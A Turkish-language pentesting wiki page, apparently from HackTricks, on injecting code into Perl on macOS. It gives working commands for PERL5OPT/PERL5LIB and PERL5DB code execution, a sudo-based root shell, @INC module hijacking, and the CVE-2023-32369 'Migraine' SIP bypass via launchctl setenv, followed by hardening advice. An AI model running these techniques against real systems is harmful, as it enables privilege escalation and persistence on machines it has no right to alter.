# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` ve `PERL5LIB` ortam değişkenleri aracılığıyla

**`PERL5OPT`** ortam değişkenini kullanarak **Perl**'ün interpreter başlatıldığında (hedef script'in ilk satırı parse edilmeden **önce** bile) arbitrary commands çalıştırmasını sağlamak mümkündür.
Örneğin, şu script'i oluşturun:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Şimdi **env variable**'ı export edin ve **perl** script'ini çalıştırın:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Başka bir seçenek de bir Perl modülü oluşturmaktır (örneğin `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Ardından, modülün otomatik olarak bulunup yüklenmesi için env değişkenlerini kullanın:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Diğer ilginç environment variables

* **`PERL5DB`** – interpreter **`-d`** (debugger) flag'iyle başlatıldığında, `PERL5DB` içeriği debugger context *içinde* Perl code olarak çalıştırılır.
Hem privileged Perl process'in environment'ını **hem de command-line flags'lerini** etkileyebiliyorsanız şuna benzer bir şey yapabilirsiniz:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # script çalıştırılmadan önce bir shell açar
```

* **`PERL5SHELL`** – Windows'ta bu variable, Perl'in bir shell başlatması gerektiğinde hangi shell executable'ını kullanacağını kontrol eder. macOS'ta ilgili olmadığı için burada yalnızca tamamlayıcı bilgi olarak belirtilmiştir.

`PERL5DB` **`-d`** switch'ini gerektirse de, verbose troubleshooting için bu flag etkinleştirilerek *root* olarak çalıştırılan maintenance veya installer script'lerine sıkça rastlanır; bu da variable'ı geçerli bir privilege escalation vector'ü hâline getirir.

## Dependencies üzerinden (@INC abuse)

Perl'in arayacağı include path'i (**`@INC`**) şu komutla listelemek mümkündür:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 üzerindeki tipik çıktı şu şekilde görünür:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Döndürülen klasörlerin bazıları aslında mevcut bile değil; ancak **`/Library/Perl/5.30`** mevcut, SIP tarafından korunmuyor ve SIP tarafından korunan klasörlerden önce geliyor. Bu nedenle *root* olarak yazabiliyorsanız, ayrıcalıklı bir script tarafından bu modül import edildiğinde *öncelikli olarak* yüklenecek kötü amaçlı bir modül (ör. `File/Basename.pm`) bırakabilirsiniz.

> [!WARNING]
> **`/Library/Perl`** içine yazmak için yine de **root** olmanız gerekir ve macOS, yazma işlemini gerçekleştiren process için *Full Disk Access* isteyen bir **TCC** prompt'u gösterecektir.

Örneğin bir script **`use File::Basename;`** import ediyorsa, saldırgan kontrollü kod içeren `/Library/Perl/5.30/File/Basename.pm` dosyasını oluşturmak mümkün olurdu.

## Migration Assistant üzerinden SIP bypass (CVE-2023-32369 “Migraine”)

Mayıs 2023'te Microsoft, **CVE-2023-32369** adlı ve **Migraine** olarak adlandırılan, *root* saldırganın System Integrity Protection'ı (SIP) tamamen **bypass** etmesine olanak tanıyan bir post-exploitation tekniğini açıkladı.
Güvenlik açığı bulunan component, **`com.apple.rootless.install.heritable`** entitlement'ına sahip bir daemon olan **`systemmigrationd`**'dir. Bu daemon tarafından spawn edilen tüm child process'ler entitlement'ı devralır ve bu nedenle SIP kısıtlamalarının **dışında** çalışır.<sup>[[1]](#references)</sup>

Araştırmacıların tespit ettiği child process'ler arasında Apple tarafından imzalanmış interpreter da bulunmaktadır:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perl `PERL5OPT` değişkenine (ve Bash `BASH_ENV` değişkenine) uyduğu için, daemon'ın *environment*'ını zehirlemek SIP'siz bir bağlamda keyfi kod yürütme elde etmek için yeterlidir:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC` çalıştığında, `/usr/bin/perl` kötü amaçlı `PERL5OPT` ile başlar ve SIP yeniden etkinleştirilmeden *önce* `/private/tmp/migraine.sh` dosyasını çalıştırır. Bu script'ten, örneğin, bir payload'u **`/System/Library/LaunchDaemons`** içine kopyalayabilir veya bir dosyayı **silinemez** hâle getirmek için `com.apple.rootless` extended attribute'ını atayabilirsiniz.

Apple bu sorunu macOS **Ventura 13.4**, **Monterey 12.6.6** ve **Big Sur 11.7.7** sürümlerinde düzeltti; ancak daha eski veya yamalanmamış sistemler hâlâ exploitable durumdadır.<sup>[[1]](#references)</sup>

## Hardening önerileri

1. **Tehlikeli değişkenleri temizleyin** – ayrıcalıklı launchdaemon'lar veya cron job'ları temiz bir environment ile başlatılmalıdır (`launchctl unsetenv PERL5OPT`, `env -i` vb.).
2. **Interpreter'ları root olarak çalıştırmaktan kaçının**; yalnızca kesinlikle gerekli olduğunda kullanın. Derlenmiş binary'leri tercih edin veya ayrıcalıkları erkenden düşürün.
3. Script'leri `-T` (taint mode) ile vendor edin; böylece taint checking etkinleştirildiğinde Perl, `PERL5OPT` ve diğer güvenli olmayan switch'leri yok sayar.
4. **macOS'u güncel tutun** – “Migraine” güncel sürümlerde tamamen patched durumdadır.

## Referanslar

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
